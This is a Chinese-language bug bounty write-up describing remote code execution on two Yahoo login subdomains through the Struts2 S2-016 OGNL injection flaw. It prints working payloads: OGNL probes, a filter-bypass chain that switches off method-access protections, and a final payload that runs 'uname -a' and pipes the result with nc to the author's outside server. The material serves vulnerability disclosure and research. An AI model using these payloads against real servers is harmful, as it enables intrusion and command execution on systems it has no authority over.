---
source: orange-tsai
source_url: https://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-2-loginyahoocom/
title: "Yahoo Bug Bounty Part 2 - *.login.yahoo.com Remote Code Execution 遠端代碼執行漏洞 | Orange Tsai"
author: "Orange Tsai"
published: 2013-11-03T16:00:00.000Z
description: "Yahoo 系列的 Part 2 來囉～ Bug Bounty 緣起說明以及 Part 1 請看以下鏈結 Yahoo Bug Bounty Part 1 - 台灣 Yahoo Blog 任意檔案下載漏洞 這次比較有趣，是遠端代碼執行！ 有漏洞的點主要在下面兩個網站： b.login.yahoo.comapt.login.yahoo.com 讓我們來看看網頁長什麼樣子! apt 似乎是 Ya"
---

* * *

Yahoo 系列的 Part 2 來囉～ Bug Bounty 緣起說明以及 Part 1 請看以下鏈結

> [Yahoo Bug Bounty Part 1 - 台灣 Yahoo Blog 任意檔案下載漏洞](http://orange-tw.blogspot.tw/2013/11/yahoo-bug-bounty-part-1-yahoo-blog.html)

這次比較有趣，是遠端代碼執行！ 有漏洞的點主要在下面兩個網站：

> b.login.yahoo.com
>
> apt.login.yahoo.com

讓我們來看看網頁長什麼樣子! apt 似乎是 Yahoo 的線上廣告管理系統，

![](https://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-2-loginyahoocom/c2f810be33abf3cc-01.png)

b 就看不出是什麼東西了XD

![](https://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-2-loginyahoocom/43f60b50fd4615f5-02.png)

出問題的原因在於這兩個網站撰寫時是使用了 Struts2 這個 Java Framework，今年七月中的時，Struts2 爆發一個嚴重的 Remote Code Execution 等級的漏洞，這個漏洞被官方編號為 [s2-016](https://struts.apache.org/release/2.3.x/docs/s2-016.html)（基本上 Struts2 可以出包的地方都出過一遍了之後再出事應該也不意外…），大致是說在 Struts2 中支援一些 Prefix 讓程式開發人員可以方便導向如 `action`, `redirect`, `redirectAction` 等，但在處理這些方法時並沒有做好過濾，造成在這之中的內容可以用 `${ognl_exp}` 的形式來執行 OGNL 如：

> redirectAction: ${123\*123}

網站會跳轉到 `/15129.action`，漏洞存在代表 `123*123` 有被伺服器運算到！

好玩的是，官方公佈漏洞時順便把攻擊 PoC 一起釋出，等於駭客可以不用再去注意漏洞發生細節在那，可以直接開始修改 Poc 並且攻擊，那個時期網路上風雲變色，一堆網站都來不及修補深受其害xDD

那時大陸著名漏洞回報網站 [烏雲](http://www.wooyun.org/) 上也一堆人在利用這個弱點洗 Rank 還滿有趣的xDD

![](https://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-2-loginyahoocom/abfb44562c75bca7-03.png)

在用剛剛的方法判斷 Yahoo 存在這個漏洞後，接著就是嘗試使用攻擊代碼嘗試執行指令，但攻擊的 Exploit 卻不能直接利用（想想也是拉，不然早就被一堆人玩到爆了XD），所以不能利用的原因在哪裡呢？接下來就是研究的部分，

來感嘆一下XD 很多 Script Kiddie 只會用網路上現成的工具入侵，但如果不確實明白原理的話很常會出現漏洞存在但工具無法使用的情況，例如 Library 路徑的不同，網路上工具都是寫死的如

> com.opensymphony.xwork2

這樣只要路徑不再預設位置上的話工具就會失敗

那要怎麼辦呢？來講個小技巧，在無法判斷位置的情況下可以利用 `#request` 這個變數來看位置以及一些敏感資訊，以這個例子來講：

> redirect: ${#request}

![](https://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-2-loginyahoocom/a1f7b69bec493a98-04.png)

可以看到網站轉址的地方就是 #request 變數的內容（看一堆東西噴出來還滿有成就感的cc），從這裡可以看到位置是預設的沒錯，還有一些敏感資訊可以記著說不定以後會用到：Ｐ

在測試的過程中發現有特定的 pattern 會造成 Exploit 失敗，猜測在伺服器上似乎有 Filter 或是一些其他的設定，造成 Exploit 失敗，所以勢必得找到那些 patttern 繞過它！！

不過好在利用的是 s2-16 redirect 弱點，可以由轉址的方式來 leakge 出一些資訊判斷 Java Code 是否執行成功，所以雖然是用黑盒但可以用 Blind 的方式來進行猜測，

Blind 測試後發現 patterns 好像有（並不完全）

1. 不能有逗點後的 method
2. 不能有雙引號
3. 不能有些特定關鍵字

所以我們要只要繞過這些限制便可以透過去執行 Java Code 的！

所以最後是透過改寫 s2-016 繞過這些 patterns 以及 OGNL Static Method 的方式來執行指令。 最後的 PoC

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>``` | ```<br>redirect: ${<br>#\_memberAccess.allowStaticMethodAccess%3dtrue,<br>#context[#parameters.aa]%3dfalse,<br>#\_memberAccess.excludeProperties%3d@java.util.Collections@EMPTY\_SET, <br>@java.lang.Thread@sleep(10000)<br>}<br>&aa=xwork.MethodAccessor.denyMethodExecution<br>``` |

![](https://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-2-loginyahoocom/7a2d70661086bf1c-05.png)

可以讓伺服器睡十秒（Total Duration 那欄可以看到超過 10000 ms）

接著是執行系統指令的部分，不過那時也凌晨三四點了，想睡覺懶得踹直接硬來把指令結果反連到自己伺服器上代表系統命令有執行成功就好XD

執行 uname -a 指令並且將結果傳回至我的伺服器上，

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>``` | ```<br>redirect: ${<br>#\_memberAccess.allowStaticMethodAccess%3dtrue,<br>#context[#parameters.aa]%3dfalse,<br>#\_memberAccess.excludeProperties%3d@java.util.Collections@EMPTY\_SET,<br>@java.lang.Runtime@getRuntime().exec(new java.lang.String[]{#parameters.a1,#parameters.a2,#parameters.a3}),<br>}<br>&aa=xwork.MethodAccessor.denyMethodExecution<br>&a1=/bin/sh<br>&a2=-c<br>&a3=uname -a | nc orange.tw 12345<br>``` |

![](https://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-2-loginyahoocom/c9cab221c1d4acc3-06.png)

耶結案，<(￣︶￣)>

Yahoo 系列應該到此結束吧！真的是一個滿有趣的體驗的！而且 Yahoo 給的獎金真的滿有誠意的！！！XD（只是領的方式比較繁瑣 =\_=）

有機會的話以後可以來嘗試當個獎金獵人XD

最後附上個 [The Bug Bounty List](https://bugcrowd.com/list-of-bug-bounty-programs/) 給有興趣的人參考：）